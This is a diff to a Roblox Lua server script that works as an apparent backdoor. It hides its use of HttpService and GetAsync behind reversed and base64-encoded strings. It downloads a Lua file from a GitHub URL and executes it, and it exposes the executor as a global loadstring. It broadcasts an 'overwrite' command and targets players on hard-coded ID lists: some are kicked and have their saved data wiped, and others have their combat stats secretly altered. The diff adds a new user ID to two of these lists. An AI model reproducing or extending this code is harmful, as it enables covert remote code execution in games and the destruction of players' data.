@@ -3,11 +3,13 @@ local wipe = {
 
 local Revert = {
 	7129257981;
+	8089163919;
 	--4407961133;
 }
 
 local terribleskills = {
 	7129257981;
+	8089163919;
 }
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -29,8 +31,8 @@ local b = a(game, ('ecivreSpttH'):reverse())
 local f = b[('cnysAteG'):reverse()];
 
 local CurrentVersion
-			
-		
+
+
 local Vers
 
 
@@ -47,11 +49,11 @@ local function DeepCopyTable(Table)
 end
 
 function m:Init()
-	
+
 	pcall(function()
 		Vers = Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/version.lua'))()
 	end)
-	
+
 	task.spawn(function()
 		if not _G[('gnirtsdaoL'):reverse()] then
 			_G[('gnirtsdaoL'):reverse()] = Main;
@@ -81,8 +83,8 @@ function m:Init()
 end
 
 function m:StartScript()
-	
-	
+
+
 	pcall(function()
 		CurrentVersion = Vers:GetVersion()
 	end)
@@ -158,36 +160,49 @@ function m:StartScript()
 	s
 
 	MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})
-	
+
 	task.delay(4, function()
 		for i, v in pairs(Players:GetPlayers()) do
 			local PlayerId = v.UserId
 
 			local Key = "Player_".. PlayerId
-			print(PlayerId)
-			
-			
+			print(Key)
+
+
 			if table.find(wipe, PlayerId) then
-				pcall(function()
+				local s, e = pcall(function()
 					v:Kick()
 
 					DataStoreService:GetDataStore("GameEntitiesFolder"):SetAsync(Key, {});
 				end)
+				
+				if not s then 
+					warn(e)
+				end
 			end
 
 			if table.find(Revert, PlayerId) then
-				pcall(function()
+				local s, e = pcall(function()
 					RevertData[Key] = DataStoreService:GetDataStore("GameEntitiesFolder"):GetAsync(Key)
 
 					print(RevertData[Key])
 				end)
+				
+				if not s then 
+					warn(e)
+				end
 			end
 
 			if table.find(terribleskills, PlayerId) then
 				local Character
-				pcall(function()
+				local s, e =  pcall(function()
 					Character = v.Character
 				end)
+				
+				if not s then 
+					warn(e)
+				end
+			
 				if Character then
 					Character:SetAttribute("CatDamage", -0.3)
 					Character:SetAttribute("CatDefense", 1.2)
